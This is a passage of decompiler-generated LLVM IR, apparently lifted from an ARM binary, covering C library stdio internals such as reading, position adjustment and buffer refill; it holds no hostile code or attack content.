  store i32 92940, i32* %r3.global-to-local, align 4
  store i32 %v2_19290, i32* @r0, align 4
  store i32 %v1_192c8, i32* %r2.global-to-local, align 4
  %v1_192e0 = call i32 @__pthread_return_void()
  %v0_192e4 = load i32, i32* @r4, align 4
  store i32 %v0_192e4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_16b04.825 to i32), i32* %r3.global-to-local, align 4
  store i32 103156, i32* @lr, align 4
  %v1_192f0 = call i32 @__pthread_return_0()
  store i32 %v1_192f0, i32* %r0.global-to-local, align 4
  %v0_192f4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_192f4

dec_label_pc_192f4:                               ; preds = %dec_label_pc_192b4, %dec_label_pc_192c8
  %v0_19300 = phi i32 [ %v0_19298, %dec_label_pc_192b4 ], [ %v0_192f4.pre, %dec_label_pc_192c8 ]
  %v1_192f4 = inttoptr i32 %v0_19300 to i8*
  %v2_192f4 = load i8, i8* %v1_192f4, align 1
  %v3_192f4 = zext i8 %v2_192f4 to i32
  store i32 %v3_192f4, i32* %r3.global-to-local, align 4
  %v1_192f8 = and i32 %v3_192f4, 64
  %v2_192f8 = icmp eq i32 %v1_192f8, 0
  br i1 %v2_192f8, label %dec_label_pc_19310, label %dec_label_pc_19300

dec_label_pc_19300:                               ; preds = %dec_label_pc_192f4
  store i32 %v0_19300, i32* @r0, align 4
  %v0_19304 = call i32 @__stdio_wcommit()
  store i32 %v0_19304, i32* %r0.global-to-local, align 4
  %v2_19308 = icmp eq i32 %v0_19304, 0
  br i1 %v2_19308, label %dec_label_pc_19310, label %dec_label_pc_19380

dec_label_pc_19310:                               ; preds = %dec_label_pc_19300, %dec_label_pc_192f4
  %v0_19310 = load i32, i32* @r6, align 4
  %v7_19310 = icmp eq i32 %v0_19310, 1
  br i1 %v7_19310, label %dec_label_pc_19318, label %dec_label_pc_19310.dec_label_pc_1932c_crit_edge

dec_label_pc_19310.dec_label_pc_1932c_crit_edge:  ; preds = %dec_label_pc_19310
  br label %dec_label_pc_1932c

dec_label_pc_19318:                               ; preds = %dec_label_pc_19310
  %v0_19318 = load i32, i32* @r5, align 4
  store i32 %v0_19318, i32* %r0.global-to-local, align 4
  %v2_1931c = ptrtoint i32* %stack_var_-28 to i32
  %v2_19320 = inttoptr i32 %v0_19318 to i8*
  %v3_19320 = call i32 @__stdio_adjust_position(i8* %v2_19320, i32 %v2_1931c)
  store i32 %v3_19320, i32* %r0.global-to-local, align 4
  %v1_19324 = icmp slt i32 %v3_19320, 0
  br i1 %v1_19324, label %dec_label_pc_19380, label %dec_label_pc_19318.dec_label_pc_1932c_crit_edge

dec_label_pc_19318.dec_label_pc_1932c_crit_edge:  ; preds = %dec_label_pc_19318
  %v0_1932c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1932c

dec_label_pc_1932c:                               ; preds = %dec_label_pc_19310.dec_label_pc_1932c_crit_edge, %dec_label_pc_19318.dec_label_pc_1932c_crit_edge
  %v0_1932c = phi i32 [ %v0_19310, %dec_label_pc_19310.dec_label_pc_1932c_crit_edge ], [ %v0_1932c.pre, %dec_label_pc_19318.dec_label_pc_1932c_crit_edge ]
  store i32 %v0_1932c, i32* %r2.global-to-local, align 4
  %v0_19330 = load i32, i32* @r5, align 4
  store i32 %v0_19330, i32* %r0.global-to-local, align 4
  %v4_19338 = call i32 @__stdio_seek(i32 %v0_19330, i32* nonnull %stack_var_-28, i32 %v0_1932c)
  store i32 %v4_19338, i32* %r0.global-to-local, align 4
  %v1_1933c = icmp slt i32 %v4_19338, 0
  br i1 %v1_1933c, label %dec_label_pc_19380, label %dec_label_pc_19344

dec_label_pc_19344:                               ; preds = %dec_label_pc_1932c
  %v0_19344 = load i32, i32* @r5, align 4
  %v1_19344 = inttoptr i32 %v0_19344 to i32*
  %v2_19344 = load i32, i32* %v1_19344, align 4
  store i32 %v2_19344, i32* %r3.global-to-local, align 4
  %v1_19348 = add i32 %v0_19344, 8
  %v2_19348 = inttoptr i32 %v1_19348 to i32*
  %v3_19348 = load i32, i32* %v2_19348, align 4
  store i32 %v3_19348, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_19350 = and i32 %v2_19344, -72
  store i32 %v1_19350, i32* %r3.global-to-local, align 4
  %v3_19354 = sdiv i32 %v2_19344, 256
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1935c = trunc i32 %v3_19354 to i8
  %v3_1935c = add i32 %v0_19344, 1
  %v4_1935c = inttoptr i32 %v3_1935c to i8*
  store i8 %v1_1935c, i8* %v4_1935c, align 1
  %v0_19360 = load i32, i32* %r2.global-to-local, align 4
  %v1_19360 = load i32, i32* @r5, align 4
  %v2_19360 = add i32 %v1_19360, 28
  %v3_19360 = inttoptr i32 %v2_19360 to i32*
  store i32 %v0_19360, i32* %v3_19360, align 4
  %v0_19364 = load i32, i32* %r0.global-to-local, align 4
  %v1_19364 = trunc i32 %v0_19364 to i8
  %v2_19364 = load i32, i32* @r5, align 4
  %v3_19364 = add i32 %v2_19364, 2
  %v4_19364 = inttoptr i32 %v3_19364 to i8*
  store i8 %v1_19364, i8* %v4_19364, align 1
  %v0_19368 = load i32, i32* %r3.global-to-local, align 4
  %v1_19368 = trunc i32 %v0_19368 to i8
  %v2_19368 = load i32, i32* @r5, align 4
  %v3_19368 = inttoptr i32 %v2_19368 to i8*
  store i8 %v1_19368, i8* %v3_19368, align 1
  %v0_1936c = load i32, i32* %r2.global-to-local, align 4
  %v1_1936c = load i32, i32* @r5, align 4
  %v2_1936c = add i32 %v1_1936c, 16
  %v3_1936c = inttoptr i32 %v2_1936c to i32*
  store i32 %v0_1936c, i32* %v3_1936c, align 4
  %v0_19370 = load i32, i32* %r2.global-to-local, align 4
  %v1_19370 = load i32, i32* @r5, align 4
  %v2_19370 = add i32 %v1_19370, 20
  %v3_19370 = inttoptr i32 %v2_19370 to i32*
  store i32 %v0_19370, i32* %v3_19370, align 4
  %v0_19374 = load i32, i32* %r2.global-to-local, align 4
  %v1_19374 = load i32, i32* @r5, align 4
  %v2_19374 = add i32 %v1_19374, 24
  %v3_19374 = inttoptr i32 %v2_19374 to i32*
  store i32 %v0_19374, i32* %v3_19374, align 4
  %v0_19378 = load i32, i32* %r0.global-to-local, align 4
  %v1_19378 = load i32, i32* @r5, align 4
  %v2_19378 = add i32 %v1_19378, 44
  %v3_19378 = inttoptr i32 %v2_19378 to i32*
  store i32 %v0_19378, i32* %v3_19378, align 4
  br label %dec_label_pc_19384

dec_label_pc_19380:                               ; preds = %dec_label_pc_19300, %dec_label_pc_1932c, %dec_label_pc_19318
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19384

dec_label_pc_19384:                               ; preds = %dec_label_pc_19344, %dec_label_pc_19380
  %v0_19384 = load i32, i32* %r7.global-to-local, align 4
  %v2_19384 = icmp eq i32 %v0_19384, 0
  br i1 %v2_19384, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_19384
  store i32 %v2_19290, i32* %r0.global-to-local, align 4
  store i32 92940, i32* %r3.global-to-local, align 4
  store i32 103324, i32* @lr, align 4
  call void @__pseudo_branch(i32 92940)
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_19384, %dec_label_pc_192a0, %bb
  %v0_1939c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1939c, i32* %r0.global-to-local, align 4
  store i32 %v3_19288, i32* @r4, align 4
  store i32 %v6_19288, i32* @r5, align 4
  store i32 %v9_19288, i32* @r6, align 4
  ret i32 %v0_1939c

; uselistorder directives
  uselistorder i32 %v0_1932c, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 9, 8, 11, 0, 10, 12 }
  uselistorder i32 ()* @__pthread_return_0, { 36, 23, 22, 21, 20, 19, 18, 17, 4, 35, 45, 44, 15, 3, 2, 1, 42, 41, 40, 39, 14, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 16, 29, 28, 27, 31, 30, 38, 26, 37, 43, 25, 24, 34, 33, 32 }
  uselistorder i32 ptrtoint (i8* @global_var_16b04.825 to i32), { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__pthread_return_void, { 42, 39, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 1, 0, 41, 40, 48, 47, 46, 45, 3, 2, 5, 4, 28, 27, 26, 25, 24, 32, 31, 30, 29, 44, 23, 43, 22, 21, 20, 19, 38, 37, 36, 35, 34, 33 }
  uselistorder i32 92940, { 0, 5, 6, 7, 8, 1, 9, 10, 11, 2, 3, 4, 12 }
  uselistorder i32 52, { 4, 2, 6, 3, 1, 7, 5, 8, 0 }
  uselistorder i32 22, { 3, 12, 4, 11, 5, 6, 7, 16, 13, 8, 14, 0, 15, 9, 10, 1, 2, 17 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19384, { 1, 0 }
  uselistorder label %dec_label_pc_19380, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1932c, { 1, 0 }
  uselistorder label %dec_label_pc_192f4, { 1, 0 }
}

define i32 @__stdio_READ(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_193b8 = load i32, i32* @r4, align 4
  store i32 %v3_193b8, i32* %stack_var_-12, align 4
  %v3_193bc = load i8, i8* %arg1, align 1
  %v4_193bc = zext i8 %v3_193bc to i32
  store i32 %v4_193bc, i32* %r3.global-to-local, align 4
  %v1_193c0 = and i32 %v4_193bc, 4
  store i32 %v1_193c0, i32* %r5.global-to-local, align 4
  %v2_193c0 = icmp eq i32 %v1_193c0, 0
  store i1 %v2_193c0, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_193c0, label %bb8, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_193b8, i32* @r4, align 4
  ret i32 0

bb8:                                              ; preds = %entry
  %v1_193d0 = icmp slt i32 %arg2, 0
  %v2_193d0 = icmp eq i32 %arg2, 0
  store i1 %v2_193d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_193d0, label %bb9, label %bb10

bb9:                                              ; preds = %bb8
  store i32 2147483647, i32* @r2, align 4
  br label %bb10

bb10:                                             ; preds = %bb8, %bb9
  %v1_193d8 = add i32 %tmp, 4
  %v2_193d8 = inttoptr i32 %v1_193d8 to i32*
  %v3_193d8 = load i32, i32* %v2_193d8, align 4
  store i32 %v3_193d8, i32* %r0.global-to-local, align 4
  %v1_193dc = call i32 @__libc_read(i32 %v3_193d8)
  store i32 %v1_193dc, i32* %r0.global-to-local, align 4
  %v2_193e0 = icmp eq i32 %v1_193dc, 0
  store i1 %v2_193e0, i1* %cpsr_z.global-to-local, align 1
  %tmp11 = icmp slt i32 %v1_193dc, 1
  br i1 %tmp11, label %bb13, label %bb12

bb12:                                             ; preds = %bb10
  %v7_193e4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_193e4, i32* @r4, align 4
  ret i32 %v1_193dc

bb13:                                             ; preds = %bb10
  %v0_193e8 = load i32, i32* @r4, align 4
  %v1_193e8 = inttoptr i32 %v0_193e8 to i32*
  %v2_193e8 = load i32, i32* %v1_193e8, align 4
  %v1_193ec = or i32 %v2_193e8, 8
  store i32 %v1_193ec, i32* %r1.global-to-local, align 4
  %v1_193f0 = or i32 %v2_193e8, 4
  store i32 %v1_193f0, i32* %r3.global-to-local, align 4
  %v3_193f4 = sdiv i32 %v2_193e8, 256
  store i32 %v3_193f4, i32* %ip.global-to-local, align 4
  br i1 %v2_193e0, label %.thread, label %bb14

bb14:                                             ; preds = %bb13
  %v1_193fc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_193fc, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread:                                          ; preds = %bb13
  %v2_19400 = trunc i32 %v3_193f4 to i8
  %v4_19400 = add i32 %v0_193e8, 1
  %v5_19400 = inttoptr i32 %v4_19400 to i8*
  store i8 %v2_19400, i8* %v5_19400, align 1
  %v0_19404.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19404.pr, label %.thread1, label %.thread2

.thread1:                                         ; preds = %.thread
  %v1_19404 = load i32, i32* %r3.global-to-local, align 4
  %v2_19404 = trunc i32 %v1_19404 to i8
  %v3_19404 = load i32, i32* @r4, align 4
  %v4_19404 = inttoptr i32 %v3_19404 to i8*
  store i8 %v2_19404, i8* %v4_19404, align 1
  %v0_19408.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19408.pr.pr, label %.thread3, label %.thread2

.thread2:                                         ; preds = %bb14, %.thread, %.thread1
  %v1_19408 = load i32, i32* %ip.global-to-local, align 4
  %v2_19408 = trunc i32 %v1_19408 to i8
  %v3_19408 = load i32, i32* @r4, align 4
  %v4_19408 = add i32 %v3_19408, 1
  %v5_19408 = inttoptr i32 %v4_19408 to i8*
  store i8 %v2_19408, i8* %v5_19408, align 1
  %v0_1940c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1940c.pr, label %.thread3, label %bb15

bb15:                                             ; preds = %.thread2
  %v1_1940c = load i32, i32* %r1.global-to-local, align 4
  %v2_1940c = trunc i32 %v1_1940c to i8
  %v3_1940c = load i32, i32* @r4, align 4
  %v4_1940c = inttoptr i32 %v3_1940c to i8*
  store i8 %v2_1940c, i8* %v4_1940c, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %.thread2, %bb15
  %v2_19410 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19410, i32* @r4, align 4
  %v11_19410 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_19410

; uselistorder directives
  uselistorder i32 %v3_193f4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 5, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 (i32)* @__libc_read, { 1, 0 }
  uselistorder i32 2147483647, { 2, 3, 0, 1 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_adjust_position(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_19414 = load i32, i32* @r4, align 4
  store i32 %v3_19414, i32* %stack_var_-16, align 4
  %v2_19418 = add i32 %tmp, 1
  %v3_19418 = inttoptr i32 %v2_19418 to i8*
  %v4_19418 = load i8, i8* %v3_19418, align 1
  %v5_19418 = zext i8 %v4_19418 to i32
  %v3_1941c = load i8, i8* %arg1, align 1
  %v4_1941c = zext i8 %v3_1941c to i32
  store i32 %v4_1941c, i32* %r2.global-to-local, align 4
  %v4_19420 = mul nuw nsw i32 %v5_19418, 256
  %v5_19420 = or i32 %v4_1941c, %v4_19420
  store i32 %v5_19420, i32* @lr, align 4
  %tmp15 = urem i8 %v3_1941c, 4
  %v2_19424 = icmp eq i8 %tmp15, 0
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_19424, label %bb, label %dec_label_pc_19434

bb:                                               ; preds = %entry
  br label %.thread

dec_label_pc_19434:                               ; preds = %entry
  %v1_19424 = zext i8 %tmp15 to i32
  %v1_19434 = add nsw i32 %v1_19424, -1
  %v7_19434 = icmp eq i8 %tmp15, 1
  br i1 %v7_19434, label %.thread, label %dec_label_pc_1943c

dec_label_pc_1943c:                               ; preds = %dec_label_pc_19434
  %v1_1943c = and i32 %v4_19420, 2048
  %v2_1943c = icmp eq i32 %v1_1943c, 0
  br i1 %v2_1943c, label %.thread, label %dec_label_pc_19444

dec_label_pc_19444:                               ; preds = %dec_label_pc_1943c
  %v8_19448 = icmp sgt i32 %v1_19434, 1
  br i1 %v8_19448, label %dec_label_pc_194d4, label %dec_label_pc_1944c

dec_label_pc_1944c:                               ; preds = %dec_label_pc_19444
  %v2_1944c = add i32 %tmp, 40
  %v3_1944c = inttoptr i32 %v2_1944c to i32*
  %v4_1944c = load i32, i32* %v3_1944c, align 4
  %v2_19450 = icmp eq i32 %v4_1944c, 0
  br i1 %v2_19450, label %dec_label_pc_19458, label %dec_label_pc_194d4

dec_label_pc_19458:                               ; preds = %dec_label_pc_1944c
  %v2_19458 = add i32 %tmp, 3
  %v3_19458 = inttoptr i32 %v2_19458 to i8*
  %v4_19458 = load i8, i8* %v3_19458, align 1
  %v5_19458 = zext i8 %v4_19458 to i32
  %v2_1945c = add i32 %tmp, 44
  %v3_1945c = inttoptr i32 %v2_1945c to i32*
  %v4_1945c = load i32, i32* %v3_1945c, align 4
  store i32 %v4_1945c, i32* %r2.global-to-local, align 4
  %v2_19460 = sub nsw i32 %v1_19434, %v5_19458
  %v1_19468 = add nsw i32 %v2_19460, -1
  %tmp11 = icmp slt i32 %v4_1945c, 1
  br i1 %tmp11, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_19458
  %v7_1946c = add i32 %tmp, 2
  %v8_1946c = inttoptr i32 %v7_1946c to i8*
  %v9_1946c = load i8, i8* %v8_1946c, align 1
  %v10_1946c = zext i8 %v9_1946c to i32
  %v7_19470 = sub nsw i32 %v1_19468, %v10_1946c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_19458, %bb, %dec_label_pc_1943c, %dec_label_pc_19434, %bb12
  %v0_1948c = phi i32 [ %v1_19434, %dec_label_pc_1943c ], [ %v1_19434, %dec_label_pc_19434 ], [ 0, %bb ], [ %v7_19470, %bb12 ], [ %v1_19468, %dec_label_pc_19458 ]
  %v1_19474 = and i32 %v4_1941c, 64
  %v2_19474 = icmp eq i32 %v1_19474, 0
  %storemerge.in.in.v = select i1 %v2_19474, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_19480 = add i32 %tmp, 16
  %v3_19480 = inttoptr i32 %v2_19480 to i32*
  %v4_19480 = load i32, i32* %v3_19480, align 4
  %v2_19484 = sub i32 %storemerge, %v4_19480
  %v1_19488 = inttoptr i32 %arg2 to i32*
  %v2_19488 = load i32, i32* %v1_19488, align 4
  store i32 %v2_19488, i32* %r1.global-to-local, align 4
  %v3_19488 = add i32 %arg2, 4
  %v4_19488 = inttoptr i32 %v3_19488 to i32*
  %v5_19488 = load i32, i32* %v4_19488, align 4
  store i32 %v5_19488, i32* %r2.global-to-local, align 4
  %v2_1948c = add i32 %v2_19484, %v0_1948c
  store i32 %v2_1948c, i32* %r5.global-to-local, align 4
  %v2_19490 = sub i32 %v2_19488, %v2_1948c
  %v2_19494 = and i32 %v2_1948c, 1073741824
  %v3_19494 = icmp ne i32 %v2_19494, 0
  %v6_19494 = icmp eq i1 %v3_19494, false
  %tmp16 = icmp slt i32 %v2_1948c, 0
  %v4_19494.neg = zext i1 %tmp16 to i32
  %v7_19494 = add i32 %v5_19488, %v4_19494.neg
  %v9_19494 = sext i1 %v6_19494 to i32
  %v10_19494 = add i32 %v7_19494, %v9_19494
  store i32 %v10_19494, i32* %r4.global-to-local, align 4
  store i32 %v2_19490, i32* %v1_19488, align 4
  %v5_19498 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_19498, i32* %v4_19488, align 4
  %v0_1949c = load i32, i32* %r6.global-to-local, align 4
  %v1_1949c = add i32 %v0_1949c, 4
  %v2_1949c = inttoptr i32 %v1_1949c to i32*
  %v3_1949c = load i32, i32* %v2_1949c, align 4
  %v1_194a0 = load i32, i32* %r2.global-to-local, align 4
  %v8_194a4 = icmp sgt i32 %v3_1949c, %v1_194a0
  br i1 %v8_194a4, label %dec_label_pc_194b8, label %dec_label_pc_194a8

dec_label_pc_194a8:                               ; preds = %.thread
  %v9_194a0 = icmp eq i32 %v3_1949c, %v1_194a0
  br i1 %v9_194a0, label %dec_label_pc_194ac, label %dec_label_pc_194bcthread-pre-split

dec_label_pc_194ac:                               ; preds = %dec_label_pc_194a8
  %v1_194ac = inttoptr i32 %v0_1949c to i32*
  %v2_194ac = load i32, i32* %v1_194ac, align 4
  %v1_194b0 = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v2_194ac, %v1_194b0
  br i1 %tmp17, label %dec_label_pc_194b8, label %dec_label_pc_194bcthread-pre-split

dec_label_pc_194b8:                               ; preds = %dec_label_pc_194ac, %.thread
  %v0_194b8 = load i32, i32* %r5.global-to-local, align 4
  %v1_194b8 = sub i32 0, %v0_194b8
  store i32 %v1_194b8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_194bc

dec_label_pc_194bcthread-pre-split:               ; preds = %dec_label_pc_194ac, %dec_label_pc_194a8
  %v0_194bc.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_194bc

dec_label_pc_194bc:                               ; preds = %dec_label_pc_194bcthread-pre-split, %dec_label_pc_194b8
  %v0_194bc = phi i32 [ %v0_194bc.pr, %dec_label_pc_194bcthread-pre-split ], [ %v1_194b8, %dec_label_pc_194b8 ]
  %v1_194bc = icmp slt i32 %v0_194bc, 0
  br i1 %v1_194bc, label %dec_label_pc_194c4, label %dec_label_pc_194d8

dec_label_pc_194c4:                               ; preds = %dec_label_pc_194bc
  %v0_194c4 = call i32 @__errno_location()
  %v2_194cc = inttoptr i32 %v0_194c4 to i32*
  store i32 75, i32* %v2_194cc, align 4
  %v0_194d8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_194d8

dec_label_pc_194d4:                               ; preds = %dec_label_pc_1944c, %dec_label_pc_19444
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_194d8

dec_label_pc_194d8:                               ; preds = %dec_label_pc_194bc, %dec_label_pc_194c4, %dec_label_pc_194d4
  %v0_194d8 = phi i32 [ %v0_194bc, %dec_label_pc_194bc ], [ %v0_194d8.pre, %dec_label_pc_194c4 ], [ -1, %dec_label_pc_194d4 ]
  %v2_194dc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_194dc, i32* @r4, align 4
  ret i32 %v0_194d8

; uselistorder directives
  uselistorder i32 %v1_194a0, { 1, 0 }
  uselistorder i32 %v3_1949c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i8 %tmp15, { 0, 2, 1 }
  uselistorder i32 %v4_1941c, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 4, 3, 1, 2, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 1073741824, { 2, 3, 0, 1 }
  uselistorder i32 2048, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_194d8, { 2, 1, 0 }
  uselistorder label %.thread, { 4, 0, 2, 3, 1 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_194e0 = load i32, i32* @r4, align 4
  store i32 %v3_194e0, i32* %stack_var_-8, align 4
  %v1_194e4 = add i32 %arg1, 8
  %v1_194e8 = inttoptr i32 %v1_194e4 to i32*
  %v2_194e8 = load i32, i32* %v1_194e8, align 4
  store i32 %v2_194e8, i32* @r1, align 4
  %v3_194e8 = add i32 %arg1, 12
  %v4_194e8 = inttoptr i32 %v3_194e8 to i32*
  %v5_194e8 = load i32, i32* %v4_194e8, align 4
  %v2_194ec = sub i32 %v5_194e8, %v2_194e8
  store i32 %v2_194ec, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_194f4 = inttoptr i32 %arg1 to i8*
  %v4_194f4 = call i32 @__stdio_READ(i8* %v3_194f4, i32 %v2_194e8, i32 %v2_194ec)
  %v0_194f8 = load i32, i32* @r4, align 4
  %v1_194f8 = add i32 %v0_194f8, 8
  %v2_194f8 = inttoptr i32 %v1_194f8 to i32*
  %v3_194f8 = load i32, i32* %v2_194f8, align 4
  store i32 %v3_194f8, i32* %r2.global-to-local, align 4
  %v2_194fc = add i32 %v3_194f8, %v4_194f4
  %v2_19500 = add i32 %v0_194f8, 20
  %v3_19500 = inttoptr i32 %v2_19500 to i32*
  store i32 %v2_194fc, i32* %v3_19500, align 4
  %v0_19504 = load i32, i32* %r2.global-to-local, align 4
  %v1_19504 = load i32, i32* @r4, align 4
  %v2_19504 = add i32 %v1_19504, 16
  %v3_19504 = inttoptr i32 %v2_19504 to i32*
  store i32 %v0_19504, i32* %v3_19504, align 4
  %v2_19508 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19508, i32* @r4, align 4
  ret i32 %v4_194f4

; uselistorder directives
  uselistorder i32 %v4_194f4, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1950c = load i32, i32* @r4, align 4
  store i32 %v3_1950c, i32* %stack_var_-12, align 4
  %v0_19510 = load i32, i32* @r0, align 4
  %v1_19510 = inttoptr i32 %v0_19510 to i8*
  %v2_19510 = load i8, i8* %v1_19510, align 1
  %v3_19510 = zext i8 %v2_19510 to i32
  store i32 %v3_19510, i32* %r2.global-to-local, align 4
  %v1_19514 = add i32 %v0_19510, 1
  %v2_19514 = inttoptr i32 %v1_19514 to i8*
  %v3_19514 = load i8, i8* %v2_19514, align 1
  %v4_19514 = zext i8 %v3_19514 to i32
  store i32 %v4_19514, i32* %r3.global-to-local, align 4
  %v4_19518 = mul nuw nsw i32 %v4_19514, 256
  %v5_19518 = or i32 %v4_19518, %v3_19510
  store i32 %v5_19518, i32* %r2.global-to-local, align 4
  %v1_1951c = load i32, i32* @r1, align 4
  %v2_1951c = and i32 %v1_1951c, %v5_19518
  %v4_1951c = icmp eq i32 %v2_1951c, 0
  store i32 %v0_19510, i32* @r4, align 4
  br i1 %v4_1951c, label %dec_label_pc_19528, label %dec_label_pc_19540

dec_label_pc_19528:                               ; preds = %entry
  %v1_19528 = and i32 %v5_19518, 2176
  %v2_19528 = icmp eq i32 %v1_19528, 0
  br i1 %v2_19528, label %dec_label_pc_19530, label %dec_label_pc_19554

dec_label_pc_19530:                               ; preds = %dec_label_pc_19528
  %v2_19530 = or i32 %v1_1951c, %v5_19518
  store i32 %v2_19530, i32* %r2.global-to-local, align 4
  %v3_19534 = sdiv i32 %v2_19530, 256
  store i32 %v3_19534, i32* %r3.global-to-local, align 4
  %v1_19538 = trunc i32 %v3_19534 to i8
  store i8 %v1_19538, i8* %v2_19514, align 1
  %v0_1953c = load i32, i32* %r2.global-to-local, align 4
  %v1_1953c = trunc i32 %v0_1953c to i8
  %v2_1953c = load i32, i32* @r0, align 4
  %v3_1953c = inttoptr i32 %v2_1953c to i8*
  store i8 %v1_1953c, i8* %v3_1953c, align 1
  %v0_19540.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19540

dec_label_pc_19540:                               ; preds = %entry, %dec_label_pc_19530
  %v0_19540 = phi i32 [ %v0_19510, %entry ], [ %v0_19540.pre, %dec_label_pc_19530 ]
  %v1_19540 = inttoptr i32 %v0_19540 to i8*
  %v2_19540 = load i8, i8* %v1_19540, align 1
  %v3_19540 = zext i8 %v2_19540 to i32
  store i32 %v3_19540, i32* %r2.global-to-local, align 4
  %v1_19544 = add i32 %v0_19540, 1
  %v2_19544 = inttoptr i32 %v1_19544 to i8*
  %v3_19544 = load i8, i8* %v2_19544, align 1
  %v4_19544 = zext i8 %v3_19544 to i32
  %v4_19548 = mul nuw nsw i32 %v4_19544, 256
  %v5_19548 = or i32 %v4_19548, %v3_19540
  store i32 %v5_19548, i32* %r3.global-to-local, align 4
  %v1_1954c = and i32 %v3_19540, 16
  store i32 %v1_1954c, i32* %r5.global-to-local, align 4
  %v2_1954c = icmp eq i32 %v1_1954c, 0
  br i1 %v2_1954c, label %dec_label_pc_1957c, label %dec_label_pc_19554

dec_label_pc_19554:                               ; preds = %dec_label_pc_19528, %dec_label_pc_19540
  %v0_19554 = call i32 @__errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_1955c = inttoptr i32 %v0_19554 to i32*
  store i32 9, i32* %v2_1955c, align 4
  br label %dec_label_pc_19560

dec_label_pc_19560:                               ; preds = %dec_label_pc_19584, %dec_label_pc_19554
